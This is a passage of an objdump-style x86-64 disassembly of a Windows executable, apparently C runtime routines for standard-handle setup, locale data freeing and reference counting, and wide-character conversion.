   140009d01:	33 f6                	xor    %esi,%esi
   140009d03:	45 33 f6             	xor    %r14d,%r14d
   140009d06:	48 63 ce             	movslq %esi,%rcx
   140009d09:	48 8d 3d c0 1a 01 00 	lea    0x11ac0(%rip),%rdi        # 0x14001b7d0
   140009d10:	48 8b c1             	mov    %rcx,%rax
   140009d13:	83 e1 3f             	and    $0x3f,%ecx
   140009d16:	48 c1 f8 06          	sar    $0x6,%rax
   140009d1a:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140009d1e:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140009d22:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140009d27:	48 83 c0 02          	add    $0x2,%rax
   140009d2b:	48 83 f8 01          	cmp    $0x1,%rax
   140009d2f:	76 0a                	jbe    0x140009d3b
   140009d31:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140009d36:	e9 8f 00 00 00       	jmp    0x140009dca
   140009d3b:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   140009d40:	8b ce                	mov    %esi,%ecx
   140009d42:	85 f6                	test   %esi,%esi
   140009d44:	74 16                	je     0x140009d5c
   140009d46:	83 e9 01             	sub    $0x1,%ecx
   140009d49:	74 0a                	je     0x140009d55
   140009d4b:	83 f9 01             	cmp    $0x1,%ecx
   140009d4e:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140009d53:	eb 0c                	jmp    0x140009d61
   140009d55:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140009d5a:	eb 05                	jmp    0x140009d61
   140009d5c:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140009d61:	ff 15 e1 55 00 00    	call   *0x55e1(%rip)        # 0x14000f348
   140009d67:	48 8b e8             	mov    %rax,%rbp
   140009d6a:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140009d6e:	48 83 f9 01          	cmp    $0x1,%rcx
   140009d72:	76 0b                	jbe    0x140009d7f
   140009d74:	48 8b c8             	mov    %rax,%rcx
   140009d77:	ff 15 63 56 00 00    	call   *0x5663(%rip)        # 0x14000f3e0
   140009d7d:	eb 02                	jmp    0x140009d81
   140009d7f:	33 c0                	xor    %eax,%eax
   140009d81:	85 c0                	test   %eax,%eax
   140009d83:	74 20                	je     0x140009da5
   140009d85:	0f b6 c8             	movzbl %al,%ecx
   140009d88:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140009d8d:	83 f9 02             	cmp    $0x2,%ecx
   140009d90:	75 07                	jne    0x140009d99
   140009d92:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140009d97:	eb 31                	jmp    0x140009dca
   140009d99:	83 f9 03             	cmp    $0x3,%ecx
   140009d9c:	75 2c                	jne    0x140009dca
   140009d9e:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140009da3:	eb 25                	jmp    0x140009dca
   140009da5:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140009daa:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140009db1:	ff ff 
   140009db3:	48 8b 05 56 1e 01 00 	mov    0x11e56(%rip),%rax        # 0x14001bc10
   140009dba:	48 85 c0             	test   %rax,%rax
   140009dbd:	74 0b                	je     0x140009dca
   140009dbf:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140009dc3:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   140009dca:	ff c6                	inc    %esi
   140009dcc:	49 83 c6 08          	add    $0x8,%r14
   140009dd0:	83 fe 03             	cmp    $0x3,%esi
   140009dd3:	0f 85 2d ff ff ff    	jne    0x140009d06
   140009dd9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009dde:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009de3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009de8:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140009ded:	48 83 c4 20          	add    $0x20,%rsp
   140009df1:	41 5e                	pop    %r14
   140009df3:	c3                   	ret
   140009df4:	40 53                	rex push %rbx
   140009df6:	48 83 ec 20          	sub    $0x20,%rsp
   140009dfa:	b9 07 00 00 00       	mov    $0x7,%ecx
   140009dff:	e8 d4 df ff ff       	call   0x140007dd8
   140009e04:	33 db                	xor    %ebx,%ebx
   140009e06:	33 c9                	xor    %ecx,%ecx
   140009e08:	e8 a3 fb ff ff       	call   0x1400099b0
   140009e0d:	85 c0                	test   %eax,%eax
   140009e0f:	75 0c                	jne    0x140009e1d
   140009e11:	e8 e2 fd ff ff       	call   0x140009bf8
   140009e16:	e8 cd fe ff ff       	call   0x140009ce8
   140009e1b:	b3 01                	mov    $0x1,%bl
   140009e1d:	b9 07 00 00 00       	mov    $0x7,%ecx
   140009e22:	e8 05 e0 ff ff       	call   0x140007e2c
   140009e27:	8a c3                	mov    %bl,%al
   140009e29:	48 83 c4 20          	add    $0x20,%rsp
   140009e2d:	5b                   	pop    %rbx
   140009e2e:	c3                   	ret
   140009e2f:	cc                   	int3
   140009e30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e35:	57                   	push   %rdi
   140009e36:	48 83 ec 20          	sub    $0x20,%rsp
   140009e3a:	33 db                	xor    %ebx,%ebx
   140009e3c:	48 8d 3d 8d 19 01 00 	lea    0x1198d(%rip),%rdi        # 0x14001b7d0
   140009e43:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140009e47:	48 85 c9             	test   %rcx,%rcx
   140009e4a:	74 0a                	je     0x140009e56
   140009e4c:	e8 0f fb ff ff       	call   0x140009960
   140009e51:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   140009e56:	48 83 c3 08          	add    $0x8,%rbx
   140009e5a:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140009e61:	72 d9                	jb     0x140009e3c
   140009e63:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009e68:	b0 01                	mov    $0x1,%al
   140009e6a:	48 83 c4 20          	add    $0x20,%rsp
   140009e6e:	5f                   	pop    %rdi
   140009e6f:	c3                   	ret
   140009e70:	48 85 c9             	test   %rcx,%rcx
   140009e73:	0f 84 00 01 00 00    	je     0x140009f79
   140009e79:	53                   	push   %rbx
   140009e7a:	48 83 ec 20          	sub    $0x20,%rsp
   140009e7e:	48 8b d9             	mov    %rcx,%rbx
   140009e81:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140009e85:	48 3b 0d 9c 08 01 00 	cmp    0x1089c(%rip),%rcx        # 0x14001a728
   140009e8c:	74 05                	je     0x140009e93
   140009e8e:	e8 8d e0 ff ff       	call   0x140007f20
   140009e93:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140009e97:	48 3b 0d 92 08 01 00 	cmp    0x10892(%rip),%rcx        # 0x14001a730
   140009e9e:	74 05                	je     0x140009ea5
   140009ea0:	e8 7b e0 ff ff       	call   0x140007f20
   140009ea5:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140009ea9:	48 3b 0d 88 08 01 00 	cmp    0x10888(%rip),%rcx        # 0x14001a738
   140009eb0:	74 05                	je     0x140009eb7
   140009eb2:	e8 69 e0 ff ff       	call   0x140007f20
   140009eb7:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140009ebb:	48 3b 0d 7e 08 01 00 	cmp    0x1087e(%rip),%rcx        # 0x14001a740
   140009ec2:	74 05                	je     0x140009ec9
   140009ec4:	e8 57 e0 ff ff       	call   0x140007f20
   140009ec9:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140009ecd:	48 3b 0d 74 08 01 00 	cmp    0x10874(%rip),%rcx        # 0x14001a748
   140009ed4:	74 05                	je     0x140009edb
   140009ed6:	e8 45 e0 ff ff       	call   0x140007f20
   140009edb:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140009edf:	48 3b 0d 6a 08 01 00 	cmp    0x1086a(%rip),%rcx        # 0x14001a750
   140009ee6:	74 05                	je     0x140009eed
   140009ee8:	e8 33 e0 ff ff       	call   0x140007f20
   140009eed:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140009ef1:	48 3b 0d 60 08 01 00 	cmp    0x10860(%rip),%rcx        # 0x14001a758
   140009ef8:	74 05                	je     0x140009eff
   140009efa:	e8 21 e0 ff ff       	call   0x140007f20
   140009eff:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140009f03:	48 3b 0d 6e 08 01 00 	cmp    0x1086e(%rip),%rcx        # 0x14001a778
   140009f0a:	74 05                	je     0x140009f11
   140009f0c:	e8 0f e0 ff ff       	call   0x140007f20
   140009f11:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140009f15:	48 3b 0d 64 08 01 00 	cmp    0x10864(%rip),%rcx        # 0x14001a780
   140009f1c:	74 05                	je     0x140009f23
   140009f1e:	e8 fd df ff ff       	call   0x140007f20
   140009f23:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140009f27:	48 3b 0d 5a 08 01 00 	cmp    0x1085a(%rip),%rcx        # 0x14001a788
   140009f2e:	74 05                	je     0x140009f35
   140009f30:	e8 eb df ff ff       	call   0x140007f20
   140009f35:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140009f3c:	48 3b 0d 4d 08 01 00 	cmp    0x1084d(%rip),%rcx        # 0x14001a790
   140009f43:	74 05                	je     0x140009f4a
   140009f45:	e8 d6 df ff ff       	call   0x140007f20
   140009f4a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140009f51:	48 3b 0d 40 08 01 00 	cmp    0x10840(%rip),%rcx        # 0x14001a798
   140009f58:	74 05                	je     0x140009f5f
   140009f5a:	e8 c1 df ff ff       	call   0x140007f20
   140009f5f:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   140009f66:	48 3b 0d 33 08 01 00 	cmp    0x10833(%rip),%rcx        # 0x14001a7a0
   140009f6d:	74 05                	je     0x140009f74
   140009f6f:	e8 ac df ff ff       	call   0x140007f20
   140009f74:	48 83 c4 20          	add    $0x20,%rsp
   140009f78:	5b                   	pop    %rbx
   140009f79:	c3                   	ret
   140009f7a:	cc                   	int3
   140009f7b:	cc                   	int3
   140009f7c:	48 85 c9             	test   %rcx,%rcx
   140009f7f:	74 66                	je     0x140009fe7
   140009f81:	53                   	push   %rbx
   140009f82:	48 83 ec 20          	sub    $0x20,%rsp
   140009f86:	48 8b d9             	mov    %rcx,%rbx
   140009f89:	48 8b 09             	mov    (%rcx),%rcx
   140009f8c:	48 3b 0d 7d 07 01 00 	cmp    0x1077d(%rip),%rcx        # 0x14001a710
   140009f93:	74 05                	je     0x140009f9a
   140009f95:	e8 86 df ff ff       	call   0x140007f20
   140009f9a:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140009f9e:	48 3b 0d 73 07 01 00 	cmp    0x10773(%rip),%rcx        # 0x14001a718
   140009fa5:	74 05                	je     0x140009fac
   140009fa7:	e8 74 df ff ff       	call   0x140007f20
   140009fac:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140009fb0:	48 3b 0d 69 07 01 00 	cmp    0x10769(%rip),%rcx        # 0x14001a720
   140009fb7:	74 05                	je     0x140009fbe
   140009fb9:	e8 62 df ff ff       	call   0x140007f20
   140009fbe:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140009fc2:	48 3b 0d 9f 07 01 00 	cmp    0x1079f(%rip),%rcx        # 0x14001a768
   140009fc9:	74 05                	je     0x140009fd0
   140009fcb:	e8 50 df ff ff       	call   0x140007f20
   140009fd0:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140009fd4:	48 3b 0d 95 07 01 00 	cmp    0x10795(%rip),%rcx        # 0x14001a770
   140009fdb:	74 05                	je     0x140009fe2
   140009fdd:	e8 3e df ff ff       	call   0x140007f20
   140009fe2:	48 83 c4 20          	add    $0x20,%rsp
   140009fe6:	5b                   	pop    %rbx
   140009fe7:	c3                   	ret
   140009fe8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009fed:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009ff2:	57                   	push   %rdi
   140009ff3:	48 83 ec 20          	sub    $0x20,%rsp
   140009ff7:	33 ff                	xor    %edi,%edi
   140009ff9:	48 8d 04 d1          	lea    (%rcx,%rdx,8),%rax
   140009ffd:	48 8b d9             	mov    %rcx,%rbx
   14000a000:	48 8b f2             	mov    %rdx,%rsi
   14000a003:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   14000a00a:	ff ff 1f 
   14000a00d:	48 23 f1             	and    %rcx,%rsi
   14000a010:	48 3b d8             	cmp    %rax,%rbx
   14000a013:	48 0f 47 f7          	cmova  %rdi,%rsi
   14000a017:	48 85 f6             	test   %rsi,%rsi
   14000a01a:	74 14                	je     0x14000a030
   14000a01c:	48 8b 0b             	mov    (%rbx),%rcx
   14000a01f:	e8 fc de ff ff       	call   0x140007f20
   14000a024:	48 ff c7             	inc    %rdi
   14000a027:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   14000a02b:	48 3b fe             	cmp    %rsi,%rdi
   14000a02e:	75 ec                	jne    0x14000a01c
   14000a030:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a035:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000a03a:	48 83 c4 20          	add    $0x20,%rsp
   14000a03e:	5f                   	pop    %rdi
   14000a03f:	c3                   	ret
   14000a040:	48 85 c9             	test   %rcx,%rcx
   14000a043:	0f 84 fe 00 00 00    	je     0x14000a147
   14000a049:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a04e:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a053:	56                   	push   %rsi
   14000a054:	48 83 ec 20          	sub    $0x20,%rsp
   14000a058:	bd 07 00 00 00       	mov    $0x7,%ebp
   14000a05d:	48 8b d9             	mov    %rcx,%rbx
   14000a060:	8b d5                	mov    %ebp,%edx
   14000a062:	e8 81 ff ff ff       	call   0x140009fe8
   14000a067:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   14000a06b:	8b d5                	mov    %ebp,%edx
   14000a06d:	e8 76 ff ff ff       	call   0x140009fe8
   14000a072:	8d 75 05             	lea    0x5(%rbp),%esi
   14000a075:	8b d6                	mov    %esi,%edx
   14000a077:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   14000a07b:	e8 68 ff ff ff       	call   0x140009fe8
   14000a080:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   14000a087:	8b d6                	mov    %esi,%edx
   14000a089:	e8 5a ff ff ff       	call   0x140009fe8
   14000a08e:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   14000a095:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000a098:	e8 4b ff ff ff       	call   0x140009fe8
   14000a09d:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   14000a0a4:	e8 77 de ff ff       	call   0x140007f20
   14000a0a9:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   14000a0b0:	e8 6b de ff ff       	call   0x140007f20
   14000a0b5:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   14000a0bc:	e8 5f de ff ff       	call   0x140007f20
   14000a0c1:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   14000a0c8:	8b d5                	mov    %ebp,%edx
   14000a0ca:	e8 19 ff ff ff       	call   0x140009fe8
   14000a0cf:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   14000a0d6:	8b d5                	mov    %ebp,%edx
   14000a0d8:	e8 0b ff ff ff       	call   0x140009fe8
   14000a0dd:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   14000a0e4:	8b d6                	mov    %esi,%edx
   14000a0e6:	e8 fd fe ff ff       	call   0x140009fe8
   14000a0eb:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   14000a0f2:	8b d6                	mov    %esi,%edx
   14000a0f4:	e8 ef fe ff ff       	call   0x140009fe8
   14000a0f9:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   14000a100:	8d 55 fb             	lea    -0x5(%rbp),%edx
   14000a103:	e8 e0 fe ff ff       	call   0x140009fe8
   14000a108:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   14000a10f:	e8 0c de ff ff       	call   0x140007f20
   14000a114:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000a11b:	e8 00 de ff ff       	call   0x140007f20
   14000a120:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   14000a127:	e8 f4 dd ff ff       	call   0x140007f20
   14000a12c:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   14000a133:	e8 e8 dd ff ff       	call   0x140007f20
   14000a138:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a13d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000a142:	48 83 c4 20          	add    $0x20,%rsp
   14000a146:	5e                   	pop    %rsi
   14000a147:	c3                   	ret
   14000a148:	40 55                	rex push %rbp
   14000a14a:	41 54                	push   %r12
   14000a14c:	41 55                	push   %r13
   14000a14e:	41 56                	push   %r14
   14000a150:	41 57                	push   %r15
   14000a152:	48 83 ec 60          	sub    $0x60,%rsp
   14000a156:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000a15b:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   14000a15f:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   14000a163:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   14000a167:	48 8b 05 92 fe 00 00 	mov    0xfe92(%rip),%rax        # 0x14001a000
   14000a16e:	48 33 c5             	xor    %rbp,%rax
   14000a171:	48 89 45 20          	mov    %rax,0x20(%rbp)
   14000a175:	44 8b ea             	mov    %edx,%r13d
   14000a178:	45 8b f9             	mov    %r9d,%r15d
   14000a17b:	48 8b d1             	mov    %rcx,%rdx
   14000a17e:	4d 8b e0             	mov    %r8,%r12
   14000a181:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000a185:	e8 66 b6 ff ff       	call   0x1400057f0
   14000a18a:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   14000a190:	85 ff                	test   %edi,%edi
   14000a192:	75 07                	jne    0x14000a19b
   14000a194:	48 8b 45 08          	mov    0x8(%rbp),%rax
   14000a198:	8b 78 0c             	mov    0xc(%rax),%edi
   14000a19b:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   14000a1a1:	45 8b cf             	mov    %r15d,%r9d
   14000a1a4:	4d 8b c4             	mov    %r12,%r8
   14000a1a7:	8b cf                	mov    %edi,%ecx
   14000a1a9:	1b d2                	sbb    %edx,%edx
   14000a1ab:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000a1b0:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a1b6:	83 e2 08             	and    $0x8,%edx
   14000a1b9:	ff c2                	inc    %edx
   14000a1bb:	e8 ac f4 ff ff       	call   0x14000966c
   14000a1c0:	4c 63 f0             	movslq %eax,%r14
   14000a1c3:	85 c0                	test   %eax,%eax
   14000a1c5:	75 07                	jne    0x14000a1ce
   14000a1c7:	33 ff                	xor    %edi,%edi
   14000a1c9:	e9 ce 00 00 00       	jmp    0x14000a29c
   14000a1ce:	49 8b f6             	mov    %r14,%rsi
   14000a1d1:	48 03 f6             	add    %rsi,%rsi
   14000a1d4:	48 8d 46 10          	lea    0x10(%rsi),%rax
   14000a1d8:	48 3b f0             	cmp    %rax,%rsi
   14000a1db:	48 1b c9             	sbb    %rcx,%rcx
   14000a1de:	48 23 c8             	and    %rax,%rcx
   14000a1e1:	74 53                	je     0x14000a236
   14000a1e3:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000a1ea:	77 31                	ja     0x14000a21d
   14000a1ec:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   14000a1f0:	48 3b c1             	cmp    %rcx,%rax
   14000a1f3:	77 0a                	ja     0x14000a1ff
   14000a1f5:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000a1fc:	ff ff 0f 
   14000a1ff:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000a203:	e8 d8 44 00 00       	call   0x14000e6e0
   14000a208:	48 2b e0             	sub    %rax,%rsp
   14000a20b:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   14000a210:	48 85 db             	test   %rbx,%rbx
   14000a213:	74 6f                	je     0x14000a284
   14000a215:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000a21b:	eb 13                	jmp    0x14000a230
   14000a21d:	e8 26 dc ff ff       	call   0x140007e48
   14000a222:	48 8b d8             	mov    %rax,%rbx
   14000a225:	48 85 c0             	test   %rax,%rax
   14000a228:	74 0e                	je     0x14000a238
   14000a22a:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   14000a230:	48 83 c3 10          	add    $0x10,%rbx
   14000a234:	eb 02                	jmp    0x14000a238
   14000a236:	33 db                	xor    %ebx,%ebx
   14000a238:	48 85 db             	test   %rbx,%rbx
   14000a23b:	74 47                	je     0x14000a284
   14000a23d:	4c 8b c6             	mov    %rsi,%r8
   14000a240:	33 d2                	xor    %edx,%edx
   14000a242:	48 8b cb             	mov    %rbx,%rcx
   14000a245:	e8 86 a4 ff ff       	call   0x1400046d0
   14000a24a:	45 8b cf             	mov    %r15d,%r9d
   14000a24d:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   14000a252:	4d 8b c4             	mov    %r12,%r8
   14000a255:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000a25a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a25f:	8b cf                	mov    %edi,%ecx
   14000a261:	e8 06 f4 ff ff       	call   0x14000966c
   14000a266:	85 c0                	test   %eax,%eax
   14000a268:	74 1a                	je     0x14000a284
   14000a26a:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   14000a271:	44 8b c0             	mov    %eax,%r8d
   14000a274:	48 8b d3             	mov    %rbx,%rdx
   14000a277:	41 8b cd             	mov    %r13d,%ecx
   14000a27a:	ff 15 68 51 00 00    	call   *0x5168(%rip)        # 0x14000f3e8
   14000a280:	8b f8                	mov    %eax,%edi
   14000a282:	eb 02                	jmp    0x14000a286
   14000a284:	33 ff                	xor    %edi,%edi
   14000a286:	48 85 db             	test   %rbx,%rbx
   14000a289:	74 11                	je     0x14000a29c
   14000a28b:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   14000a28f:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   14000a295:	75 05                	jne    0x14000a29c
   14000a297:	e8 84 dc ff ff       	call   0x140007f20
   14000a29c:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   14000a2a0:	74 0b                	je     0x14000a2ad
   14000a2a2:	48 8b 45 00          	mov    0x0(%rbp),%rax
   14000a2a6:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   14000a2ad:	8b c7                	mov    %edi,%eax
   14000a2af:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   14000a2b3:	48 33 cd             	xor    %rbp,%rcx
   14000a2b6:	e8 75 8e ff ff       	call   0x140003130
   14000a2bb:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   14000a2bf:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   14000a2c3:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   14000a2c7:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000a2cb:	41 5f                	pop    %r15
   14000a2cd:	41 5e                	pop    %r14
   14000a2cf:	41 5d                	pop    %r13
   14000a2d1:	41 5c                	pop    %r12
   14000a2d3:	5d                   	pop    %rbp
   14000a2d4:	c3                   	ret
   14000a2d5:	cc                   	int3
   14000a2d6:	cc                   	int3
   14000a2d7:	cc                   	int3
   14000a2d8:	f0 ff 41 10          	lock incl 0x10(%rcx)
   14000a2dc:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   14000a2e3:	48 85 c0             	test   %rax,%rax
   14000a2e6:	74 03                	je     0x14000a2eb
   14000a2e8:	f0 ff 00             	lock incl (%rax)
   14000a2eb:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   14000a2f2:	48 85 c0             	test   %rax,%rax
   14000a2f5:	74 03                	je     0x14000a2fa
   14000a2f7:	f0 ff 00             	lock incl (%rax)
   14000a2fa:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   14000a301:	48 85 c0             	test   %rax,%rax
   14000a304:	74 03                	je     0x14000a309
   14000a306:	f0 ff 00             	lock incl (%rax)
   14000a309:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   14000a310:	48 85 c0             	test   %rax,%rax
   14000a313:	74 03                	je     0x14000a318
   14000a315:	f0 ff 00             	lock incl (%rax)
   14000a318:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000a31c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000a322:	48 8d 15 9f fe 00 00 	lea    0xfe9f(%rip),%rdx        # 0x14001a1c8
   14000a329:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000a32d:	74 0b                	je     0x14000a33a
   14000a32f:	48 8b 10             	mov    (%rax),%rdx
   14000a332:	48 85 d2             	test   %rdx,%rdx
   14000a335:	74 03                	je     0x14000a33a
   14000a337:	f0 ff 02             	lock incl (%rdx)
   14000a33a:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000a33f:	74 0c                	je     0x14000a34d
   14000a341:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   14000a345:	48 85 d2             	test   %rdx,%rdx
   14000a348:	74 03                	je     0x14000a34d
   14000a34a:	f0 ff 02             	lock incl (%rdx)
   14000a34d:	48 83 c0 20          	add    $0x20,%rax
   14000a351:	49 83 e8 01          	sub    $0x1,%r8
   14000a355:	75 cb                	jne    0x14000a322
   14000a357:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   14000a35e:	e9 79 01 00 00       	jmp    0x14000a4dc
   14000a363:	cc                   	int3
   14000a364:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a369:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a36e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a373:	57                   	push   %rdi
   14000a374:	48 83 ec 20          	sub    $0x20,%rsp
   14000a378:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   14000a37f:	48 8b d9             	mov    %rcx,%rbx
   14000a382:	48 85 c0             	test   %rax,%rax
   14000a385:	74 79                	je     0x14000a400
   14000a387:	48 8d 0d 82 03 01 00 	lea    0x10382(%rip),%rcx        # 0x14001a710
   14000a38e:	48 3b c1             	cmp    %rcx,%rax
   14000a391:	74 6d                	je     0x14000a400
   14000a393:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   14000a39a:	48 85 c0             	test   %rax,%rax
   14000a39d:	74 61                	je     0x14000a400
   14000a39f:	83 38 00             	cmpl   $0x0,(%rax)
   14000a3a2:	75 5c                	jne    0x14000a400
   14000a3a4:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   14000a3ab:	48 85 c9             	test   %rcx,%rcx
   14000a3ae:	74 16                	je     0x14000a3c6
   14000a3b0:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a3b3:	75 11                	jne    0x14000a3c6
   14000a3b5:	e8 66 db ff ff       	call   0x140007f20
   14000a3ba:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000a3c1:	e8 aa fa ff ff       	call   0x140009e70
   14000a3c6:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000a3cd:	48 85 c9             	test   %rcx,%rcx
   14000a3d0:	74 16                	je     0x14000a3e8
   14000a3d2:	83 39 00             	cmpl   $0x0,(%rcx)
   14000a3d5:	75 11                	jne    0x14000a3e8
   14000a3d7:	e8 44 db ff ff       	call   0x140007f20
   14000a3dc:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000a3e3:	e8 94 fb ff ff       	call   0x140009f7c
   14000a3e8:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   14000a3ef:	e8 2c db ff ff       	call   0x140007f20
   14000a3f4:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000a3fb:	e8 20 db ff ff       	call   0x140007f20
   14000a400:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   14000a407:	48 85 c0             	test   %rax,%rax
   14000a40a:	74 47                	je     0x14000a453
   14000a40c:	83 38 00             	cmpl   $0x0,(%rax)
   14000a40f:	75 42                	jne    0x14000a453
   14000a411:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   14000a418:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   14000a41f:	e8 fc da ff ff       	call   0x140007f20
   14000a424:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000a42b:	bf 80 00 00 00       	mov    $0x80,%edi
   14000a430:	48 2b cf             	sub    %rdi,%rcx
   14000a433:	e8 e8 da ff ff       	call   0x140007f20
   14000a438:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
